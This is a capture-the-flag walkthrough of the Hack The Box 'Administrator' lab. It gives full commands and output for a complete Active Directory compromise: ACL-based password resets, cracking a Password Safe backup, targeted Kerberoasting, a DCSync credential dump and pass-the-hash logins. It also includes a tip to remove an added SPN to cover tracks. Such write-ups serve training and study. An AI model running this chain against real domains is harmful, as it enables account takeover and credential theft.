---
title: Hack The Box - CTF Lab - Administrator - Medium
date: 2025-06-07 00:00:01 +0800
image: /images/thumbnails/Administrator.jpg
categories: [HTB Labs]
tags: [CPTS, Medium]
---
Administrator is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the michael account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user olivia has GenericAll permissions over michael, allowing us to reset his password. With access as michael, it is revealed that he can force a password change on the user benjamin, whose password is reset. This grants access to FTP where a backup.psafe3 file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user emily. Further enumeration shows that emily has GenericWrite permissions over the user ethan, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for ethan, who is found to have DCSync rights ultimately allowing retrieval of the Administrator account hash and full domain compromise.

" As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich "

First we do a full nmap scan:
```
sudo nmap -sC -sV -p- 10.10.11.42

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-06 19:54 EDT
Nmap scan report for 10.10.11.42
Host is up (0.031s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-07 06:54:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
57554/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57559/tcp open  msrpc         Microsoft Windows RPC
57570/tcp open  msrpc         Microsoft Windows RPC
57581/tcp open  msrpc         Microsoft Windows RPC
57617/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-07T06:55:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.39 seconds
```
We notice the presence of an ftp server on port 21. 

We try to connect to it with the provided user credentials:
```
ftp Olivia@10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
ftp> 
```
but the user Olivia is either restricted or does not have an ftp directory.

From the credentials we were given (Olivia:ichliebedich), let's test if this is a local computer account or a domain user account by using ldapsearch:
```
ldapsearch -x -H ldap://10.10.11.42 -D "ADMINISTRATOR\Olivia" -w ichliebedich -b "DC=administrator,DC=htb0" -s sub "(objectClass=*)"
# extended LDIF
#
# LDAPv3
# base <DC=administrator,DC=htb0> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 10 Referral
text: 0000202B: RefErr: DSID-0310084B, data 0, 1 access points
	ref 1: 'adminis
 trator.htb0'

ref: ldap://administrator.htb0/DC=administrator,DC=htb0

# numResponses: 1
```
and by using the NETBIOS format we see that there is an entry on the domain controller.

Now that we have confirmed these are domain user credentials, we can use bloodhound.py to ingest the LDAP data from the domain controller. 
```
pipx install bloodhound-ce

bloodhound-ce-python -u Olivia -p ichliebedich -d administrator.htb -c All -ns 10.10.11.42 -dc administrator.htb
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 05S
```
Then we can use our bloodhound installation (installation guide at https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) and import all of these files generated by the bloodhound-ce-python collector.

After everything is imported, we can go ahead and find all the attributes of our user Olivia in Bloodhound.

In pathfinding, we see that Olivia has GenericAll permissions to a user called Michael, meaning that we have complete control over the user object Michael:
![image tooltip](images/screenshots/Screenshot%202025-06-07%20135530.png)

We can then use the net user 

From the nmap scan, since port 5985 is open on the domain controller 10.10.11.42, we can use evil win-rm to login with Olivia's credentials and change the password of Michael's account:
```
sudo evil-winrm -i 10.10.11.42 -u Olivia -p ichliebedich
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael Password123@ /domain
The command completed successfully.
```
Now we can connect to Michael's account:
```
sudo evil-winrm -i 10.10.11.42 -u michael -p Password123@
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> 
```
We then check the account Michael@administrator.htb on Bloodhound and see that it has the ForceChangePassword privilege over the Benjamin@administrator.htb account.

We run the following with the Michael account using PowerView.ps1 to change Benjamin's password:
```
*Evil-WinRM* PS C:\Users\michael\Documents> Import-Module C:\Users\michael\Documents\PowerView.ps1
*Evil-WinRM* PS C:\Users\michael\Documents> $UserPassword = ConvertTo-SecureString 'Password123@' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword
```
We see that the Benjamin user is not a remote management user but has the additional group called "share moderators," which sounds like an additional fileshare permission. 

We then try to login to the ftp server using Benjamin's credentials:
```
ftp benjamin@10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.

ftp> dir
229 Entering Extended Passive Mode (|||64827|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||64828|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************|   952       30.56 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (30.26 KiB/s)
```
And we get a file named Backup.psafe3 which contains a password safe 3 hash.

We now can use hashcat to attempt to crack this hash using the rockyou.txt wordlist:
```
sudo hashcat -m 5200 Backup.psafe3 rockyou.txt

Backup.psafe3:tekieromucho 
```
and we get the master password "tekieromucho."

Now we can install passwordsafe using "sudo apt install passwordsafe" and access the Backup.psafe3 file. 

We see three entries in passwordsafe:
```
Alexander Smith [alexander] Password: UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
Emily Rodriguez [emily] Password: UXLCI5iETUsIBoFVTj8yQFKoHjXmb
Emma Johnson [emma] Password: WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Now we can try evil-winrm to remote into 10.10.11.42 as the emily user:
```
sudo evil-winrm -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -i 10.10.11.42

*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
589db095747f022f26c887afff1c9508
```
and we finally get the user.txt file.

### user.txt found

We check Bloodhound again and see that the Emily user has GenericWrite privilege over the Ethan user.

We use the following command chain to get Ethan's hash:
```
$SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('administrator.htb\emily', $SecPassword)

Set-DomainObject -Credential $Cred -Identity ethan -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

Get-DomainSPNTicket -Credential $Cred nonexistent/BLAHBLAH | fl

sudo hashcat -m 13100 hash.txt rockyou.txt

$krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$6924aa0714905463483b41e89c98e0f3$28df915d678fda613a237db0d8f5d79ded925eb252e8685a09d2f6902382e2cad08b10eea7a2ad0cefbf40a771673bc4fb4fb76e6543db1ddf866e96b69e907e2fedb1311cfef77dfc3edfe3a168940f1dcd1dbf5558f4d9b5070b47bd12686b07c4285b92f86e10b7321ff3c6d9b9e0e6d7bd81515399425b4f642d5107b0ef18748477092be530a3c37b3a3e1bbabbbf5a115b9b007def0d7ed8d5d9fb735c66bc49a915e59a7cf9acc440a7cbeba28e2df693bad37305b687930f80efc655141d9f13cd0400d207fc468a479a75cc5658a93350556184c100087534fbeed887979b8412ddf632c6026f74e61c2073743b30249d8c06c96332c0ac2a02227671bd63a1dd3ad6129126284a15ad6779526b6606d0f68f13b8d452d20c9172c25a9ddcc8e66c900da5a71eb21f6c7537f7190558e3aceae7054bdc8a357d348d6148d7c0678904d79188233ac8e2a625314e8aaa03ffaab9f67b1837873e95b3d2777949018f8f1df78f6d8965ed529901349d707e906838f6b512bd2d9a4c27aeb8d77b7d1f318fb09a5a754b5c231fe51d3c13a27e359556bb0620b725642ad7d4d79a4bdedd1f74a47273fd3cc1549e5d334b81351aaf4696bf582e0e217f77ece6bf79cce729dc73665c4920d4f567eb66dbf447e03c946692242df1f02c54785444c2211408dded8dc5c7c15bf889d28ab76e3301cfb1ac2070a7fb9b04236b9f476efd02b7282c7c22e1e2c2916b06de3be9762c4f802b0b27e87fad4287aa2b5a215fc3e44004b3ac39b6ffc207321d87499a9925a4d2d00404c7c0bc012c41b459815e0aeac8b149af382c3f6e4504b010490ec871a4dab89b3bf02020136bffbb41d53abb40ad7a7655b75148af283fd78a980ab76da454ae5a0530d9c95287b2e41340f0978a5a65b6b92665161c6786fcb4c77dfe7894eab35cbbc6614f02eaff594333e18339bd1c8f8011a36285846f6180da5023b361cb4f9f52adf832cc2e8e4188c509ee9a2dd498de97668d005976993dab0499592cbca59cc79f475efb61fd1ed14f2b6ad4a72ec2e3845caf875d6c0daefb5e635df5dfe467d9544bfa6fd9eee3f4e9fe76615a5871fabe6151332c8c68a5dc7b9da0899e1414c03d189eb5bf615c4eff6fce44f351d5bfddab930a8ab7b622ef6aea0cea321544f2df3ed86698c2ed0b0d4ac6dc13e5b55a91f7c8be03539f09d22c2dba7ddbd7d82cc3dc72b4a2e5a75cbbc5c07cb161db32d7af30680cb48f6b73f5eafb0e923e5a0e1cac81980811cc6ee734d9b599b788196f42bd32e65f7a5984fd7a92f98255a1fd0ee6bdeb784a2dce56501b90b9bee22e385f89fe39bdc3a849f35cedb51169733d2b3e92ab79ad48d04dadf138e176d69c222deda10ee295fd528fe6d761b242d3ee99976a669e7e70abe4e5a9c868a29a3dcf837e187a9506ba3ebbd3af24bc794e15516746129b6afd7fe4de5d25995ca96d2a0537f7e6de4fe6c1f6f3622fdd42ab0f960685be448a457d166671d61cafea59f4e9a07736f0cd8a304bab7f34f9e2cd6a0d07dacf5dd3977bcfc7fba44bf3132c4562c128b08eb3ac020b06735e82bfdf63938e0835c4e6b0620911cb5a1d0b0f58b1c12ea84b966ada5accf780bf598c756269980300227a6edd9016a605b46f3df287080e9c0b00741f4b507c0899137d87a063433086acbf8227bb:limpbizkit
```
(The actual command output of the hash had a weird spacing format that would not work with hashcat. Make sure you get rid of all the spacing and have the hash in the correct format like above.)

We finally get the credential pair ethan:limpbizkit  

In a real engagement, we also should delete the SPN we created to cover our tracks:
```
Set-DomainObject -Credential $Cred -Identity (username) -Clear serviceprincipalname
```
In Bloodhound, we notice that the user Ethan has DCSync privilege so we can use secretsdump.py to get the password hash of the domain administrator:
```
 secretsdump.py -just-dc administrator.htb/ethan@10.10.11.42
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:cc8147f790c91200a3e02c2ebc65f9fb:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:cc8147f790c91200a3e02c2ebc65f9fb:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:8c1a7cadc3ddd92674d13ff37bf0cf7773e4bdaf3378ea9e4e94fdb602760cc8
administrator.htb\michael:aes128-cts-hmac-sha1-96:1a9c007587233e81af172e15ce0ae62d
administrator.htb\michael:des-cbc-md5:c77f94f826e0b66e
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:55ade9738cec7b6737bb0e9a22538914f9ad86015243ab7e33b289a383118877
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:35102c04bf8ce28d3e6a0c131219bdee
administrator.htb\benjamin:des-cbc-md5:f1da51c2206b26ec
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```
Now that we have the NTLM hash '3dc553ce4b9fd20bd016e098d2d2fd2e' for domain admin, we can use pass the hash to login as domain admin and get the final flag:
```
evil-winrm -i 10.10.11.42 -u Administrator -H'3dc553ce4b9fd20bd016e098d2d2fd2e'

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4ac8d0e26ad1bb226b8aff899123f135
```

All in all, this box was pretty easy since you start with a domain user account, assuming you did not have any trouble getting Bloodhound to work, which can be a huge pain. Most of the work lies in investigating your access in Bloodhound for lateral movement, as well as utilize the ftp server to acquire the psafe file, crack the psafe master password using hashcat, and download passwordsafe to utilize the psafe file. 








